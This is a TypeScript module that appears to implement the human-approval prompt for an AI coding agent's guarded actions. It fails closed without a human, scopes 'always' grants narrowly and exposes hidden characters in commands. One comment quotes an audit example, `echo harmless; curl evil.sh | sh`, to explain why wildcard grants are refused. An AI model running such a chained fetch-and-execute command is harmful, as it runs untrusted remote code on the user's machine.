/**
 * approval.ts — the human side of the guard.
 *
 * The runtime asks a yes/no question; this module renders it, reads exactly one
 * line from the same chat bar and answers. Sessions with no human attached fail
 * closed: an ask nobody can answer is a denial, never a silent allow.
 */

import type { ApprovalHandler, ApprovalRequest, GuardAction, GuardKind, Lease, Runtime } from "../contracts";
import * as core from "../core";
import {
  PermissionCorrectedError,
  PermissionDeclinedError,
  type StructuredApprovalOutcome,
} from "../core/guards/defect-tunnel";
import { SESSION_LEASE_TTL_MS } from "../core/loop";
import { mintHumanApprovalGrant } from "../core/human-approval-principal";
import type { KernelClient } from "../core/kernel";
import { richDiff } from "./diff";
import { formatApprovalAskAnnouncement, screenReaderMode } from "./a11y";
import {
  approvalCard,
  createApprovalStageState,
  reduceApprovalStageKey,
  type ApprovalCardInput,
  type ApprovalStage,
  type ApprovalStageResolution,
  type ApprovalStageState,
  type KeyAnswer,
} from "./approval-card";
import {
  type ApprovalKeyPrompt,
  approvalCardScreenRows,
} from "./approval-key-prompt";
import {
  formatUnattendedApprovalDenial,
  permissionAlwaysConfirmLines,
  permissionAlwaysLines,
  permissionPresentationForRequest,
  permissionRejectSteeringLines,
  savedAllowStaleFootnote,
  sessionGrantTtlMinutes,
} from "./permission-presentation";
import { appendSavedAllow } from "../core/saved-allows";
import {
  hydrateSessionGrantFromKernel,
  recordSessionGrantExpiry,
  sessionGrantRemainingMs,
} from "../core/session-grant-clock";
import { grantRemainingMinutesFromMs } from "./grant-ttl";
import { inspectPrincipalPosture, type PrincipalMode } from "./trust-spine-status";
import { emitOsc7501 } from "./osc7501";
import { createRenderer, diffBlock, previewOf, type Renderer } from "./render";
import { bold, cyan, dim, errorMessage, sanitizeText, terminalWidth, truncate, yellow } from "./style";

type RuntimeWithExtras = Runtime & {
  /** Optional: remember an approval decision as a lease for this session. */
  grantLease?: (kind: string, pattern: string, ttlMs?: number) => unknown;
  workspace?: string;
};

function workspaceFromUi(ui: ApprovalUi): string | undefined {
  const runtime = ui.runtime as RuntimeWithExtras | undefined;
  const ws = runtime?.workspace;
  return typeof ws === "string" && ws !== "" ? ws : undefined;
}

export interface ApprovalUi {
  /** True when a human is attached and can answer. */
  interactive: boolean;
  /** Reads one line from the chat bar; replaced by the running UI. */
  ask: (question: string, opts?: { signal?: AbortSignal }) => Promise<string>;
  /**
   * Optional single-key mode (rich TTY): shows the card lines and resolves on
   * one keypress without Enter. Absent => the line prompt below is used.
   */
  askKey?: (prompt: ApprovalKeyPrompt) => Promise<KeyAnswer>;
  /**
   * Optional 3-stage single-key driver (rich TTY): drives `permission` ->
   * `always_confirm` / `reject_steer` using `reduceApprovalStageKey`.
   */
  askStagedKey?: (
    prompt: ApprovalKeyPrompt,
    initial: ApprovalStageState,
  ) => Promise<ApprovalStageResolution>;
  /**
   * Enable interactive 3-stage prompting (`permission` -> `always_confirm` /
   * `reject_steer`) in line mode. Defaults to false for backwards compatibility.
   */
  threeStage?: boolean;
  /**
   * When true, a plain user decline in `createApprovalHandler` throws
   * `PermissionDeclinedError` instead of returning `false`.
   */
  throwDeclinedDefect?: boolean;
  /** False selects ASCII card borders (non-UTF-8 locale). */
  unicode?: boolean;
  /** Where notices go; replaced by the running UI's renderer. */
  renderer: Renderer;
  /** The runtime this UI is talking to right now (swapped by /new). */
  runtime?: Runtime;
}

export {
  createApprovalStageState,
  reduceApprovalStageKey,
  type ApprovalStage,
  type ApprovalStageResolution,
  type ApprovalStageState,
};

/** Parse single-line steering prefixes like `n: use narrower path` or `reject: ...`. */
export function parseInlineSteeringAnswer(raw: string): string | undefined {
  const match = /^\s*(?:n|no|r|reject|steer)\s*:\s*(.+)$/is.exec(raw);
  if (!match) return undefined;
  const feedback = match[1]?.trim() ?? "";
  return feedback !== "" ? feedback : undefined;
}

let printModeNoticesToStderr = false;

/** Route unattended approval denial notices to stderr while `runPrint` (`-p`) owns stdout. */
export function setApprovalPrintMode(on: boolean): void {
  printModeNoticesToStderr = Boolean(on);
}

/** Build the mutable hand-off between main.ts, the chat loop and the guard. */
export function createApprovalUi(interactive: boolean): ApprovalUi {
  return {
    interactive: Boolean(interactive),
    // Safe default: until a UI attaches, nobody can answer, so deny.
    ask: async () => "",
    renderer: createRenderer({ wrap: false }),
    runtime: undefined,
  };
}

const grantTtlMinutes = sessionGrantTtlMinutes(SESSION_LEASE_TTL_MS);

/**
 * Remember an "always" for this session, scoped to the approved TARGET: an
 * "always" for `npm run dev` in the workspace must not become authority over
 * every shell command anywhere for the next TTL (the confirmed defect was a
 * kind-wide pattern "*"). Only kind and target are known here, so the exact
 * target is the grant — a target that was already a directory-scoped pattern
 * keeps that scope verbatim, never broadened.
 *
 * The GRANT is minted through the kernel client with the session id when both
 * are available, so owner scoping applies: a subagent child's checks carry the
 * child's session id and re-enter approval (docs/09 R-tools-32). A runtime that
 * exposes only grantLease() falls back to the legacy owner-less shape (globally
 * consultable — documented in kernel.ts); no target at all means there is
 * nothing narrower than everything to grant, so the answer stays "this time".
 * Ruling 32: the minted object is a grant, not a lease — it authorises a fresh
 * one-use lease per covered effect (a lease would be spent by its first use).
 */
async function rememberAlways(
  ui: ApprovalUi,
  kind: string,
  target: string,
  ctx: { kernel?: KernelClient; sessionId?: string },
  r: Renderer,
): Promise<boolean> {
  if (target === "" || kind === "other") return false;
  // The lease language reads a trailing `*` as a PREFIX wildcard
  // (guard.rs::pattern_matches, kernel.ts::patternMatches). A command or path
  // whose own text ends in `*` — the shell command `echo *`, a literal file
  // named `out*` — therefore cannot be expressed as an exact pattern: minting
  // it would silently widen the grant to everything with that prefix (the
  // audit's `echo *` grant covered `echo harmless; curl evil.sh | sh`). No
  // exact target, no remembered grant: the answer stays "this time".
  if (target.endsWith("*")) return false;
  try {
    if (ctx.kernel !== undefined && typeof ctx.sessionId === "string" && ctx.sessionId !== "") {
      // Ruling 32: "always" mints a session GRANT — a bounded pre-authorisation
      // that mints a fresh one-use lease per effect it covers (a lease would be
      // spent by its first use, turning "always" into "once").
      const grant = await mintHumanApprovalGrant(
        ctx.kernel,
        kind as GuardKind,
        target,
        ctx.sessionId,
        SESSION_LEASE_TTL_MS,
      );
      recordSessionGrantExpiry(ctx.sessionId, kind, target, grant.expiry);
      const ws = workspaceFromUi(ui);
      if (ws !== undefined) {
        const refused = await appendSavedAllow(ws, kind as GuardKind, target);
        if (refused !== undefined) r.notice(refused);
      }
      return true;
    }
    const runtime = ui.runtime as RuntimeWithExtras | undefined;
    const grant = runtime?.grantLease;
    if (typeof grant !== "function") return false;
    await Promise.resolve(grant.call(runtime, kind, target));
    const ws = workspaceFromUi(ui);
    if (ws !== undefined) {
      const refused = await appendSavedAllow(ws, kind as GuardKind, target);
      if (refused !== undefined) r.notice(refused);
    }
    return true;
  } catch (err) {
    r.notice(`could not remember that decision: ${errorMessage(err)}`);
    return false;
  }
}

/** Show format/invisible Unicode (bidi, zero-width, U+2028/9) as visible <U+XXXX>. */
function escapeInvisible(text: string): string {
  return text.replace(/[\u200b-\u200f\u2028-\u202e\u2060\u2066-\u2069\ufeff]/g, (c) => {
    return `<U+${(c.codePointAt(0) ?? 0).toString(16).toUpperCase().padStart(4, "0")}>`;
  });
}

/**
 * A shell.exec detail is the command text itself. Nothing may vanish from it:
 * ANSI escapes, C0/C1 controls (except tab and newline) and DEL are made visible
 * as <U+XXXX> rather than stripped, so the displayed text is the executed text.
 */
function escapeCommand(input: unknown): string {
  const s = input === undefined || input === null ? "" : String(input);
  return escapeInvisible(
    s.replace(/[\u0000-\u0008\u000b-\u001f\u007f-\u009f]/g, (c) => {
      return `<U+${c.charCodeAt(0).toString(16).toUpperCase().padStart(4, "0")}>`;
    }),
  );
}

/**
 * Run the approval prompt (supporting both 3-stage interactive flow and legacy
 * 1-stage / headless flows) and return a structured outcome.
 */
export async function runStagedApprovalPrompt(
  ui: ApprovalUi,
  req: ApprovalRequest,
  action?: GuardAction,
  kernel?: KernelClient,
  gateSessionId?: string,
): Promise<StructuredApprovalOutcome> {
  const kind = sanitizeText(req?.kind ?? "other") || "other";
  const workspace = workspaceFromUi(ui);
  const tgtForFootnote = typeof action?.target === "string" ? action.target : "";
  const kindForFootnote =
    typeof action?.kind === "string" ? action.kind : sanitizeText(req?.kind ?? "other") || "other";
  const staleFootnote = savedAllowStaleFootnote(workspace, kindForFootnote, tgtForFootnote);
  const presentation = permissionPresentationForRequest(req, workspace);
  const sanitizePresentationLine = (line: string): string =>
    kind === "shell.exec"
      ? escapeCommand(line).replace(/\r?\n/g, " ").trim()
      : escapeInvisible(sanitizeText(line)).replace(/\s+/g, " ").trim();
  const presentationLines = (
    staleFootnote !== undefined ? [...presentation.lines, staleFootnote] : [...presentation.lines]
  )
    .map(sanitizePresentationLine)
    .filter((line) => line !== "");
  const title =
    escapeInvisible(sanitizeText(presentation.title || req?.title))
      .replace(/\s+/g, " ")
      .trim() || "this action";
  // Titles stay tidy (whitespace collapsed). A shell.exec detail is the command
  // itself, shown verbatim so `cat 'a   b'` reads as it runs; invisible and
  // direction-changing Unicode is made visible as <U+XXXX> in every detail.
  const detail =
    kind === "shell.exec"
      ? escapeCommand(req?.detail ?? "").replace(/^\s+|\s+$/g, "")
      : escapeInvisible(sanitizeText(req?.detail ?? "")).replace(/\s+/g, " ").trim();
  const r = ui.renderer;

  if (!ui.interactive) {
    const denial = formatUnattendedApprovalDenial(presentation, kind, detail);
    if (printModeNoticesToStderr) {
      process.stderr.write(`\u00b7 ${sanitizeText(denial)}\n`);
    } else {
      r.notice(denial);
    }
    return { decision: "declined" };
  }

  r.ensureLineStart();
  emitOsc7501((c) => process.stdout.write(c), "blocked", { kind: "permission" });
  const stagedKeyMode = typeof ui.askStagedKey === "function";
  const keyMode = !stagedKeyMode && typeof ui.askKey === "function";
  const tgt = tgtForFootnote;
  const canAlways = tgt !== "" && !tgt.endsWith("*") && kind !== "other";
  if (screenReaderMode()) {
    r.line(
      formatApprovalAskAnnouncement({
        title,
        detail: kind === "shell.exec" ? detail : detail || undefined,
        canAlways: (keyMode || stagedKeyMode) && canAlways,
      }),
    );
  }
  const gateSessionForGrant =
    typeof gateSessionId === "string" && gateSessionId !== ""
      ? gateSessionId
      : typeof ui.runtime?.sessionId === "string"
        ? ui.runtime.sessionId
        : "";
  if (kernel && gateSessionForGrant !== "" && tgtForFootnote !== "") {
    await hydrateSessionGrantFromKernel(kernel, gateSessionForGrant, kindForFootnote, tgtForFootnote);
  }
  const grantLookup =
    gateSessionForGrant !== "" && tgtForFootnote !== ""
      ? () => sessionGrantRemainingMs(gateSessionForGrant, kindForFootnote, tgtForFootnote)
      : undefined;

  const guardianLine =
    typeof req?.guardian === "string" && req.guardian !== ""
      ? escapeInvisible(sanitizeText(req.guardian)).replace(/\s+/g, " ").trim()
      : "";
  if (!keyMode && !stagedKeyMode) {
    // The presentation title usually names the target ("Write /ws/a.txt"), so
    // appending the raw detail again would read `/ws/a.txt? /ws/a.txt`.
    const titleNamesTarget = detail !== "" && title.endsWith(detail);
    const suffix = detail !== "" && !titleNamesTarget ? " " + detail : "";
    r.write("\n" + yellow("\u26a0") + " " + bold("Approve " + title + "?") + suffix + "\n");
    if (guardianLine !== "") r.write(guardianLine + "\n");
    if (staleFootnote !== undefined) r.write(dim(staleFootnote) + "\n");
  }
  // An optional preview rides the request when the caller can produce one (a
  // staged diff for a plan-mode write): shown before the ask, absent on old
  // callers — the prompt is unchanged then.
  const preview = previewOf(req);
  if (preview !== "") {
    r.write(
      (keyMode || stagedKeyMode
        ? richDiff(preview, { width: Math.min(terminalWidth(), 100), unicode: ui.unicode }).join("\n")
        : diffBlock(preview)) + "\n",
    );
  }

  const buildApprovalCard = (stageState?: ApprovalStageState): string[] => {
    const liveMs = grantLookup?.();
    const reqPrincipal = req as ApprovalRequest & {
      principalMode?: PrincipalMode;
      principalKeyFingerprint?: string;
    };
    const localPrincipal =
      reqPrincipal.principalMode === undefined ? inspectPrincipalPosture() : undefined;
    const principalMode = reqPrincipal.principalMode ?? localPrincipal?.principalMode;
    const principalKeyFingerprint =
      reqPrincipal.principalKeyFingerprint ?? localPrincipal?.principalKeyFingerprint;
    const card: ApprovalCardInput = {
      kind,
      title,
      icon: presentation.icon,
      presentationLines,
      detail,
      guardian: guardianLine,
      effectId: req.effectId,
      leaseId: req.leaseId,
      tool: req.tool,
      principalMode,
      principalKeyFingerprint,
      width: Math.min(terminalWidth(), 100),
      unicode: ui.unicode,
      canAlways,
      grantTtlMinutes,
      grantActiveRemainingMinutes: liveMs !== undefined ? grantRemainingMinutesFromMs(liveMs) : undefined,
      grantActiveRemainingMs: liveMs,
      ...(stageState !== undefined
        ? {
            stage: stageState.stage,
            alwaysPattern: stageState.alwaysPattern ?? tgt,
            steeringInput: stageState.steeringInput,
          }
        : {}),
    };
    return approvalCard(card);
  };

  const finalizeAlways = async (): Promise<StructuredApprovalOutcome> => {
    // Grant the target the guard asked about, not the kind: the pattern must
    // match the same string the guard checks against, so it is the raw target.
    const target = typeof action?.target === "string" ? action.target : "";
    const grantKind = typeof action?.kind === "string" ? action.kind : kind;
    // The gate names the session the check speaks for; a runtime that exposes
    // its own sessionId is the fallback for plain `handler(req)` callers.
    const sessionId =
      typeof gateSessionId === "string" && gateSessionId !== ""
        ? gateSessionId
        : typeof ui.runtime?.sessionId === "string"
          ? ui.runtime.sessionId
          : undefined;
    const remembered = await rememberAlways(ui, grantKind, target, { kernel, sessionId }, r);
    if (remembered) {
      const hint = permissionAlwaysLines(grantKind, target).join(" ");
      r.notice(`approved (${hint})`);
      return { decision: "approved", scope: "always" };
    }
    r.notice("approved (this time)");
    return { decision: "approved", scope: "once" };
  };

  // Rich TTY 3-stage keypress mode
  if (stagedKeyMode) {
    const initial = createApprovalStageState({ canAlways, alwaysPattern: tgt || detail });
    let activeStageState: ApprovalStageState = initial;
    const lines = buildApprovalCard(initial);
    r.write("\n" + lines.join("\n") + "\n");
    const keyPrompt: ApprovalKeyPrompt = {
      lines,
      screenRows: approvalCardScreenRows(lines.length),
      ...(grantLookup !== undefined
        ? {
            onTick: () =>
              activeStageState.stage === "permission"
                ? buildApprovalCard(activeStageState)
                : buildApprovalCard(activeStageState),
          }
        : {}),
      stage: initial.stage,
      renderStage: (st) => {
        activeStageState = st;
        return buildApprovalCard(st);
      },
    };
    let resolution: ApprovalStageResolution;
    try {
      resolution = await (ui.askStagedKey as NonNullable<ApprovalUi["askStagedKey"]>)(keyPrompt, initial);
    } catch {
      r.notice("no answer \u2014 denied");
      return { decision: "declined" };
    }
    if (resolution.kind === "approved") {
      if (resolution.scope === "always") return finalizeAlways();
      r.notice("approved (this time)");
      return { decision: "approved", scope: "once" };
    }
    if (resolution.kind === "rejected_with_steering") {
      r.notice(`rejected with steering: ${truncate(resolution.feedback, 60)}`);
      return { decision: "rejected_with_steering", feedback: resolution.feedback };
    }
    r.notice("denied");
    return { decision: "declined" };
  }

  // Interactive 3-stage line mode (permission -> always_confirm / reject_steer)
  if (!keyMode && ui.threeStage === true) {
    let stage: ApprovalStage = "permission";
    for (let guard = 0; guard < 16; guard += 1) {
      if (stage === "permission") {
        let raw = "";
        try {
          const promptLabel = canAlways
            ? dim(" [y]es once / [a]lways / [n]o (reject/steer) ") + bold(cyan("\u276f "))
            : dim(" [y]es once / [n]o (reject/steer) ") + bold(cyan("\u276f "));
          raw = await ui.ask(promptLabel);
        } catch {
          r.notice("no answer \u2014 denied");
          return { decision: "declined" };
        }
        const inlineSteering = parseInlineSteeringAnswer(raw);
        if (inlineSteering !== undefined) {
          r.notice(`rejected with steering: ${truncate(inlineSteering, 60)}`);
          return { decision: "rejected_with_steering", feedback: inlineSteering };
        }
        const choice = String(raw ?? "").trim().toLowerCase();
        if (choice === "y" || choice === "yes" || choice === "once") {
          r.notice("approved (this time)");
          return { decision: "approved", scope: "once" };
        }
        if (choice === "a" || choice === "always") {
          if (canAlways) {
            stage = "always_confirm";
            continue;
          }
          return finalizeAlways();
        }
        if (choice === "n" || choice === "no" || choice === "r" || choice === "reject") {
          stage = "reject_steer";
          continue;
        }
        r.notice(choice === "" ? "no answer \u2014 denied" : `did not understand "${truncate(choice, 24)}" \u2014 denied`);
        return { decision: "declined" };
      }

      if (stage === "always_confirm") {
        const confirmLines = permissionAlwaysConfirmLines(kindForFootnote, tgt || detail, SESSION_LEASE_TTL_MS);
        for (const line of confirmLines) r.write(dim(line) + "\n");
        let confirmRaw = "";
        try {
          confirmRaw = await ui.ask(dim(" Confirm always? [y] confirm / [n/Esc] back ") + bold(cyan("\u276f ")));
        } catch {
          r.notice("no answer \u2014 denied");
          return { decision: "declined" };
        }
        const trimmed = String(confirmRaw ?? "").trim().toLowerCase();
        if (trimmed === "") {
          r.notice("no answer \u2014 denied");
          return { decision: "declined" };
        }
        if (trimmed === "y" || trimmed === "yes") {
          return finalizeAlways();
        }
        stage = "permission";
        continue;
      }

      // Stage 3: reject_steer
      const steerLines = permissionRejectSteeringLines(title);
      for (const line of steerLines) r.write(dim(line) + "\n");
      let steerRaw = "";
      try {
        steerRaw = await ui.ask(dim(" Steering reason (Enter to reject, 'esc' to go back) ") + bold(cyan("\u276f ")));
      } catch {
        r.notice("denied");
        return { decision: "declined" };
      }
      const trimmedSteer = String(steerRaw ?? "").trim();
      if (trimmedSteer === "\u001b" || trimmedSteer.toLowerCase() === "esc" || trimmedSteer.toLowerCase() === "back") {
        stage = "permission";
        continue;
      }
      if (trimmedSteer !== "") {
        r.notice(`rejected with steering: ${truncate(trimmedSteer, 60)}`);
        return { decision: "rejected_with_steering", feedback: trimmedSteer };
      }
      r.notice("denied");
      return { decision: "declined" };
    }
    r.notice("denied");
    return { decision: "declined" };
  }

  // Legacy 1-stage single-key or line mode (100% backwards-compatible)
  let answer = "";
  try {
    if (keyMode) {
      const lines = buildApprovalCard();
      r.write("\n" + lines.join("\n") + "\n");
      const keyPrompt: ApprovalKeyPrompt =
        grantLookup !== undefined
          ? {
              lines,
              screenRows: approvalCardScreenRows(lines.length),
              onTick: () => buildApprovalCard(),
            }
          : lines;
      answer = await (ui.askKey as NonNullable<ApprovalUi["askKey"]>)(keyPrompt);
    } else {
      answer = await ui.ask(dim(" [y]es / [n]o / [a]lways ") + bold(cyan("\u276f ")));
    }
  } catch {
    answer = "";
  }

  const inlineSteering = parseInlineSteeringAnswer(answer);
  if (inlineSteering !== undefined) {
    r.notice(`rejected with steering: ${truncate(inlineSteering, 60)}`);
    return { decision: "rejected_with_steering", feedback: inlineSteering };
  }

  const choice = String(answer ?? "").trim().toLowerCase();
  if (choice === "a" || choice === "always") {
    return finalizeAlways();
  }
  if (choice === "y" || choice === "yes") {
    r.notice("approved (this time)");
    return { decision: "approved", scope: "once" };
  }
  if (choice === "n" || choice === "no") {
    r.notice("denied");
    return { decision: "declined" };
  }

  r.notice(choice === "" ? "no answer \u2014 denied" : `did not understand "${truncate(choice, 24)}" \u2014 denied`);
  return { decision: "declined" };
}

/** Structured approval handler returning `StructuredApprovalOutcome`. */
export function createStructuredApprovalHandler(
  ui: ApprovalUi,
): (
  req: ApprovalRequest,
  action?: GuardAction,
  kernel?: KernelClient,
  gateSessionId?: string,
) => Promise<StructuredApprovalOutcome> {
  return (req, action, kernel, gateSessionId) =>
    runStagedApprovalPrompt(ui, req, action, kernel, gateSessionId);
}

/** The handler registered with the core runtime. */
export function createApprovalHandler(ui: ApprovalUi): ApprovalHandler {
  // The gate calls this with the action and the kernel client when it has them
  // (see loop.ts ApprovalWithContext); both are optional so a plain
  // `handler(req)` caller keeps working.
  const handler = async (
    req: ApprovalRequest,
    action?: GuardAction,
    kernel?: KernelClient,
    gateSessionId?: string,
  ): Promise<boolean> => {
    const outcome = await runStagedApprovalPrompt(ui, req, action, kernel, gateSessionId);
    if (ui.interactive) emitOsc7501((c) => process.stdout.write(c), "working");
    if (outcome.decision === "approved") return true;
    const meta = {
      kind: typeof action?.kind === "string" ? action.kind : req?.kind,
      target: typeof action?.target === "string" ? action.target : req?.detail,
    };
    if (outcome.decision === "rejected_with_steering") {
      throw new PermissionCorrectedError(outcome.feedback, meta);
    }
    if (ui.throwDeclinedDefect === true) {
      throw new PermissionDeclinedError(undefined, meta);
    }
    return false;
  };
  return handler as ApprovalHandler;
}

type CoreExtra = {
  setApprovalHandler?: (handler: ApprovalHandler) => void;
  default?: { setApprovalHandler?: (handler: ApprovalHandler) => void };
};

/**
 * Hand the approval handler to the core runtime. Returns false when this core
 * build does not expose the hook yet — the chat keeps working, asks simply fail
 * closed instead of hanging.
 */
export function installApprovalHandler(ui: ApprovalUi): boolean {
  const mod = core as unknown as CoreExtra;
  const fn = typeof mod?.setApprovalHandler === "function" ? mod.setApprovalHandler : mod?.default?.setApprovalHandler;
  if (typeof fn !== "function") return false;
  try {
    fn(createApprovalHandler(ui));
    return true;
  } catch {
    return false;
  }
}
